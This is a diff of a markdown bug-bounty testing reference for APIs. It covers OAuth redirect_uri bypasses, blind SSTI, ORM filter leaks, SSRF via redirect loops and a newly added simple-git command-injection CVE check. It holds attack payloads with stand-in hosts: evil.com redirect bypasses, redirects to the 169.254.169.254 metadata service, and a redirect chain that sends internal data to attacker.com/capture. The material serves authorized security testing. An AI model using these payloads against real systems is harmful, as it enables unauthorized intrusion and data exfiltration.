@@ -4,7 +4,7 @@ Advanced testing patterns for API-specific, GraphQL, JWT, OAuth, and specialized
 
 ## Table of Contents
 
-[Tech Stack Patterns](#tech-stack-patterns) | [GraphQL](#graphql) | [JWT](#jwt-json-web-token) | [OAuth 2.0](#oauth-20--openid-connect) | [Rate Limiting](#api-rate-limiting--resource-exhaustion) | [AI/Agent Routing](#aiagent-attack-surface-routing) | [n8n Sandbox Escape](#n8n--workflow-automation-sandbox-escapes) | [Path Normalization](#edge-framework-path-normalization-bypass) | [GraphQL WS Depth](#graphql-websocket-subscription-depth-bypass) | [Admin Panel Logic](#admin-panel-logic-errors--typo-to-rce-pattern) | [HTTP/3 Race](#http3-race-conditions-quicker) | [DNS Rebinding SSRF](#dns-rebinding-ssrf-bypass-toctou) | [RSC DoS](#react-server-components-dos) | [Vibe-Coded Apps](#vibe-coded-application-attack-surface) | [Data Pipeline SSTI](#data-pipeline-template-injection-ssti--ssrf) | [PortSwigger #1-3](#error-based-blind-ssti-detection-portswigger-1-2025) | [Stream Backpressure DoS](#stream-backpressure-dos-nodejs) | [Async Auth Bypass](#async-auth-bypass-missing-await)
+[Tech Stack Patterns](#tech-stack-patterns) | [GraphQL](#graphql) | [JWT](#jwt-json-web-token) | [OAuth 2.0](#oauth-20--openid-connect) | [Rate Limiting](#api-rate-limiting--resource-exhaustion) | [AI/Agent Routing](#aiagent-attack-surface-routing) | [n8n Sandbox Escape](#n8n--workflow-automation-sandbox-escapes) | [Path Normalization](#edge-framework-path-normalization-bypass) | [GraphQL WS Depth](#graphql-websocket-subscription-depth-bypass) | [Admin Panel Logic](#admin-panel-logic-errors--typo-to-rce-pattern) | [HTTP/3 Race](#http3-race-conditions-quicker) | [DNS Rebinding SSRF](#dns-rebinding-ssrf-bypass-toctou) | [RSC DoS](#react-server-components-dos) | [Vibe-Coded Apps](#vibe-coded-application-attack-surface) | [Data Pipeline SSTI](#data-pipeline-template-injection-ssti--ssrf) | [PortSwigger #1-3](#error-based-blind-ssti-detection-portswigger-1-2025) | [Stream Backpressure DoS](#stream-backpressure-dos-nodejs) | [Async Auth Bypass](#async-auth-bypass-missing-await) | [simple-git RCE](#npm-library-command-injection-simple-git)
 
 > **Infrastructure & platform patterns** (CSS exfiltration, SSRF chains, Node.js bypass, remote desktop, MDM, webmail RCE, critical infra auth bypass, MotW bypass): See [infrastructure-vulns.md](infrastructure-vulns.md)
 
@@ -133,23 +133,13 @@ When you know the target's technology, focus your testing:
 | 9 | IdP confusion | Mix tokens between identity providers | Cross-IdP authentication bypass |
 | 10 | PKCE downgrade | Remove `code_verifier` from token request | Server doesn't enforce PKCE |
 
-**Bypasses for redirect_uri validation:**
-- URL encoding: `%2F%2Fevil.com`
-- Parameter pollution: `redirect_uri=legit.com&redirect_uri=evil.com`
-- Fragment: `redirect_uri=legit.com%23@evil.com`
-- Subdomain: `redirect_uri=legit.com.evil.com`
-- Path: `redirect_uri=legit.com/callback/../../evil`
+**redirect_uri bypasses:** URL encoding (`%2F%2Fevil.com`), parameter pollution, fragment (`%23@evil.com`), subdomain (`legit.com.evil.com`), path traversal (`/callback/../../evil`)
 
 ---
 
 ## API Rate Limiting & Resource Exhaustion
 
-**What it is:** Abusing insufficient rate limiting or resource controls on API endpoints.
-
-**Where to look:**
-- Authentication endpoints (login, password reset, 2FA)
-- Search and data export endpoints
-- Any endpoint that triggers expensive operations
+**Where to look:** Auth endpoints (login, password reset, 2FA), search/export endpoints, anything triggering expensive operations.
 
 **Test patterns:**
 
@@ -403,9 +393,7 @@ For full AI/LLM hunting methodology, see the **ai-hunting** skill.
 
 **What it is:** Blind server-side template injection where rendered output is not directly visible — detected via error-based techniques and polyglot payloads that trigger distinguishable errors across template engines. Named **#1 web hacking technique of 2025** by PortSwigger.
 
-**Why it matters:** Traditional SSTI detection relies on seeing `49` in the response when injecting `{{7*7}}`. Error-based detection works when output is consumed internally (emails, PDFs, logs, background jobs, admin dashboards) — dramatically expanding the SSTI attack surface.
-
-**Where to look:** Email template editors, PDF generators, report builders, notification systems, admin dashboards, any feature where user input is processed by a template engine but output is not directly returned in the HTTP response.
+**Where to look:** Any feature where user input hits a template engine but output isn't directly returned (email editors, PDF generators, report builders, notification systems, admin dashboards). Error-based detection works when traditional `{{7*7}}` reflection isn't visible.
 
 **Test patterns:**
 
@@ -440,19 +428,17 @@ For full AI/LLM hunting methodology, see the **ai-hunting** skill.
 | 5 | Aggregate leaking | Test for aggregate endpoints: `?filter[salary][gt]=100000&count=true` | Count/aggregate responses leak statistical data about hidden columns |
 | 6 | Nested include expansion | Request related objects: `?include=user.role,user.sessions,user.api_keys` | ORM includes related objects not intended for the current user |
 
-**Key principle:** The ORM trusts the application to restrict which fields are queryable, but many frameworks auto-generate filter capabilities for all model fields. Test every model field and relationship — not just the ones returned in the response. Boolean-based extraction (filter returns results or doesn't) enables extracting sensitive data character-by-character.
+**Key principle:** ORMs auto-generate filter capabilities for all model fields — test every field and relationship, not just those returned in responses. Boolean-based extraction enables character-by-character data leak.
 
-**Severity Guidance:** High when leaking PII or credentials via boolean oracle. Critical when extracting admin API keys or bypassing access controls via relationship traversal. Report as information disclosure (CWE-200) or broken access control (CWE-639).
+**Severity Guidance:** High when leaking PII via boolean oracle. Critical when extracting credentials or bypassing access controls via relationship traversal (CWE-200/CWE-639).
 
 ---
 
 ## SSRF via HTTP Redirect Loops (PortSwigger #3, 2025)
 
-**What it is:** Technique that converts blind SSRF into visible SSRF by exploiting HTTP redirect loop behavior — when a server follows redirects, the redirect chain itself becomes an information channel. Named **#3 web hacking technique of 2025** by PortSwigger.
+**What it is:** Converts blind SSRF to visible by exploiting HTTP redirect loop behavior — redirect chain metadata (timing, errors, counts) becomes an information channel. Named **#3 web hacking technique of 2025** by PortSwigger.
 
-**Why it matters:** Blind SSRF is often marked as low/informational severity because the attacker can't see the response. Redirect loops change this by making the server's internal network visible through redirect chain metadata (timing, error messages, redirect counts).
-
-**Where to look:** Any SSRF endpoint that follows HTTP redirects — webhook validators, URL preview/unfurl features, image proxies, link checkers, import-by-URL features, PDF generators.
+**Where to look:** Any SSRF endpoint following redirects — webhook validators, URL preview/unfurl, image proxies, link checkers, import-by-URL, PDF generators.
 
 **Test patterns:**
 
@@ -460,10 +446,10 @@ For full AI/LLM hunting methodology, see the **ai-hunting** skill.
 |---|------|-----------|-----------------|
 | 1 | Redirect to internal services | Set up redirect chain: `attacker.com/redir` → 302 to `http://169.254.169.254/latest/meta-data/` | Server follows redirect to internal service; response content or error reveals data |
 | 2 | Redirect loop port scan | Create redirect chain that cycles through internal ports: `attacker.com/scan?port=N` → 302 to `http://127.0.0.1:N/` | Different response times or error messages per port reveal open/closed status |
-| 3 | Chained redirect exfiltration | Redirect to internal service, then redirect response back to attacker: `internal:8080` → 302 to `attacker.com/capture?data=RESPONSE` | Internal service response data captured in redirect URL parameters |
-| 4 | Redirect count differential | Compare redirect behavior for existing vs non-existing internal hosts | Different redirect counts or timeout behavior reveals internal network topology |
+| 3 | Chained redirect exfiltration | Redirect to internal service, then back to attacker: `internal:8080` → 302 → `attacker.com/capture?data=RESPONSE` | Internal service response data captured via redirect |
+| 4 | Redirect count differential | Compare redirect behavior for existing vs non-existing internal hosts | Redirect counts/timeouts reveal internal topology |
 
-**Severity Guidance:** High when converting blind SSRF to visible — this is the upgrade technique that turns informational findings into impactful reports. Combine with DNS rebinding (see [DNS Rebinding SSRF Bypass](#dns-rebinding-ssrf-bypass-toctou)) for maximum coverage. Cross-reference: [infrastructure-vulns.md → SSRF via Webhook](infrastructure-vulns.md#ssrf-via-webhook-notification-and-import-endpoints) for the March 2026 CVE cluster.
+**Severity Guidance:** High — upgrades informational blind SSRF to visible. Combine with [DNS rebinding](#dns-rebinding-ssrf-bypass-toctou) and [infrastructure-vulns SSRF cluster](infrastructure-vulns.md#ssrf-via-webhook-notification-and-import-endpoints).
 
 ---
 
@@ -497,3 +483,16 @@ For full AI/LLM hunting methodology, see the **ai-hunting** skill.
 | 2 | Microservice isolation | Test each auth service independently (SSO, API gateway, main app) | Different async handling per service |
 
 **Where this pays:** Node.js/TypeScript with async auth. Source code grep: `bcrypt.compare(`, `verify(`, `authenticate(` WITHOUT `await`. Also: `if (someAsyncCheck())` — Promise is always truthy.
+
+---
+
+## NPM Library Command Injection (simple-git)
+
+**CVE-2026-28292** (simple-git 3.15.0–3.32.2, CVSS 9.8). Command injection via unsanitized arguments passed to git subprocess. Affects any Node.js app using `simple-git` for git operations — widely used (10M+ weekly npm downloads).
+
+| # | Test | What to do | What to look for |
+|---|------|-----------|-----------------|
+| 1 | Dependency check | `grep -r "simple-git" package.json package-lock.json` | Versions 3.15.0–3.32.2 are vulnerable |
+| 2 | Input-to-git tracing | Find user inputs passed to simple-git methods (`clone`, `pull`, `checkout`, `log`) | Unsanitized branch names, URLs, or paths reaching git CLI |
+
+**Where this pays:** Any Node.js app with git integration (CI/CD dashboards, code review tools, deployment panels). Check `package-lock.json` for `simple-git` versions.
